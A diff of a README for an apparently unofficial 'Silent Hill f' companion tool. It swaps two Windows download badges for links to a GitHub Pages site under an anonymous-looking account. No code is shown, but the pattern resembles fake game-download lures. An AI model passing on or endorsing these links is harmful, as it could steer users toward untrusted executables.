@@ -5,10 +5,8 @@
 </div>
 <br>
 
-<div align="center">
+[![GET Silent Hill](https://img.shields.io/badge/GET%20%E2%80%94%20Silent-Hill-0078D6?style=for-the-badge&logoColor=white)](https://t46442324.github.io/.github/Silent-Hill)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://silent-hill-f-companion.github.io/.github/)
-</div>
 
 ---
 
@@ -24,10 +22,8 @@ Map tracking functionality helps you document locations, safe zones, and importa
 <img src="https://static0.thegamerimages.com/wordpress/wp-content/uploads/2025/08/silent-hill-f-gameplay.jpg?w=1600&h=900&fit=crop" width="auto">
 </div>
 
-<div align="center">
+[![GET Silent Hill](https://img.shields.io/badge/GET%20%E2%80%94%20Silent-Hill-0078D6?style=for-the-badge&logoColor=white)](https://t46442324.github.io/.github/Silent-Hill)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://silent-hill-f-companion.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
